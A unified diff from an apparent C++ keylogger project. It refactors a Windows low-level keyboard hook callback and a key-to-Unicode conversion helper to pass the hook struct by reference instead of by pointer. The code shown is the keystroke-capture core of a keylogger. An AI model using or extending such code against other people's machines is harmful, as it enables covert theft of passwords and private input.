@@ -14,7 +14,7 @@ LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam) {
 	// If an action occurred and the keydown event was fired, log the respective 
 	// characters of the KBD hook.
 	if (code == HC_ACTION && wparam == WM_KEYDOWN)
-		keylogger::log_kbd(reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam));
+		keylogger::log_kbd(*reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam));
 
 	return CallNextHookEx(hook, code, wparam, lparam);
 }
@@ -51,9 +51,9 @@ bool keyboard_util::is_down(DWORD vk_code) noexcept {
 }
 
 // Convert a kbd hook to the respective unicode characters.
-std::wstring keyboard_util::kbd_to_unicode(const KBDLLHOOKSTRUCT* kbd_hook) {
+std::wstring keyboard_util::kbd_to_unicode(const KBDLLHOOKSTRUCT& kbd_hook) {
 	WCHAR key_buffer[constants::key_buffer_size];
-	const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, get_state().data(),
+	const auto result = ToUnicode(kbd_hook.vkCode, kbd_hook.scanCode, get_state().data(),
 		key_buffer, constants::key_buffer_size, 0);
 
 	// If the result was successful, return the buffer. If not, return an empty string.
